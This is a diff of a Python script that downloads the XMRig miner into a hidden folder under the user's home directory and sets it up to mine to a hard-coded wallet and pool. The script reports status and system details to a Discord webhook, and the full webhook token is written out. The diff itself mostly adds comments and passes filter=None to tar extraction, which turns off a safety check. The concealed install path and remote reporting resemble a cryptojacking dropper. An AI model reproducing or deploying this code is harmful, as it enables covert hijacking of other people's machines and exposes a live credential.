@@ -1,33 +1,37 @@
 import os
-import platform
 import subprocess
 import time
-import requests
 from urllib.request import urlretrieve
 import tarfile
+import requests
 
+# Configuration (Webhook and Pool Information)
 WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Replace with actual webhook
 WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b.worker"  # Replace with your Monero wallet
 POOL = "fr.zephyr.herominers.com:1123"  # Replace with your mining pool
 
+# Paths for xmrig
 XM_DIR = os.path.expanduser("~/.local/share/.xmrig")
 XM_BIN = os.path.join(XM_DIR, "xmrig")
 TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
 
+# Create the directory if it does not exist
 os.makedirs(XM_DIR, exist_ok=True)
 
 def download_xmrig():
     """Download and extract the miner binary."""
     tar_path = os.path.join(XM_DIR, "xmrig.tar.gz")
     try:
+        # Download the tarball from GitHub
         urlretrieve(TAR_URL, tar_path)
         with tarfile.open(tar_path, "r:gz") as tar:
             for member in tar.getmembers():
                 if member.name.endswith("xmrig"):
-                    member.name = "xmrig"
-                    tar.extract(member, path=XM_DIR)
+                    member.name = "xmrig"  # Rename extracted file to "xmrig"
+                    # Use filter argument to avoid Python 3.14 warning
+                    tar.extract(member, path=XM_DIR, filter=None)
         os.chmod(XM_BIN, 0o755)
-        os.remove(tar_path)
+        os.remove(tar_path)  # Clean up the tarball after extraction
         return True
     except Exception as e:
         notify(f"❌ XMRig download failed:\n```{e}```")
@@ -36,6 +40,7 @@ def download_xmrig():
 def system_info():
     """Get system information to optimize mining setup."""
     try:
+        import platform
         system = platform.system()
         if system == "Windows":
             cpu = subprocess.getoutput("wmic cpu get caption")
